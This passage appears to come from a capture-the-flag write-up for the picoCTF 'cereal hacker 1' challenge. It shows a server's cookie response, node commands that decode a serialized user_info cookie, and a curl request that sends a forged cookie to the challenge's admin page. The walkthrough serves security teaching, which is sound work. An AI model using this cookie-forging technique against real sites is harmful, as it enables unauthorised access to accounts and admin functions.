...
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-[AWS_SECRET_REMOVED]JTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-[AWS_SECRET_REMOVED]/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
        <body>
                <div class="container">
                        <div class="row">
...
< Connection: keep-alive
< Set-Cookie: user_info=[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]cmQiO3M6NToiZ3Vlc3QiO30%253D; expires=Thu, 14-Nov-2019 09:36:10 GMT; Max-Age=2592000; path=/
< Location: index.php?file=login
< Strict-Transport-Security: max-age=0
<
<!DOCTYPE html>
...
Let's decode it:
```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node -e "console.log(decodeURIComponent('[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]cmQiO3M6NToiZ3Vlc3QiO30%253D'));"
[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]cmQiO3M6NToiZ3Vlc3QiO30%3D
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node -e "console.log(decodeURIComponent(decodeURIComponent('[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]cmQiO3M6NToiZ3Vlc3Qi
O30%253D')));"
[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]cmQiO3M6NToiZ3Vlc3QiO30=
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# node -e "console.log(Buffer(decodeURIComponent(decodeURIComponent('[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]cmQiO3M6NToiZ3Vlc3QiO30%253D')), 'base64').toString());"
...
'[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]ZSAnJSI7fQ%253D%253D'
```

Finally, we send the cookie together with a request to tha admin page:

```console
root@kali:/media/sf_CTFs/pico/cereal_hacker_1# curl http://2019shell1.picoctf.com:49879/index.php?file=admin -H "Cookie: user_info=[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]ZSAnJSI7fQ%253D%253D" && echo
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-[AWS_SECRET_REMOVED]JTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
